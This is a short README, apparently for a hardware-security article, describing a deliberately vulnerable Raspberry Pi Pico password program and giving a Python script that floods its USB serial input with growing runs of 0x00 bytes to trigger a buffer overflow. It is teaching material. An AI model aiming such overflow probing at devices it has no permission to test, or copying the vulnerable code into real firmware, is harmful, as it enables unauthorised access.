# January 2026 - Buffer Overflow

This article shows an example buffer overflow. You'll find the code from the article in the `article_figures` folder.

You can find the full source in the [pico-source\colin_overflow_password\usb\password_usb.c](pico-source\colin_overflow_password\usb\password_usb.c) file. You can build this like
you do following the [https://github.com/raspberrypi/pico-examples](pico-examples) repository from Raspberry Pi.

## Attacking

As described in the article, you can attack this code by overwriting the buffer! A very simple attack works as follows:

```
import serial

#Pico USB Serial - no baud needed, but need to set dtr
ser = serial.Serial("com5", timeout=2)
ser.dtr = True

for i in range(60, 200, 1):
    ser.write(b"\x00"*i + b"\n\r")
    data = ser.read(100)
    print("%4s :"%i + str(data))
```

This sends 0x00 (in the above, the `\x00` means 0x00, change that to `\xFF` to see what happens instead) in long sequences and records what the system responds with.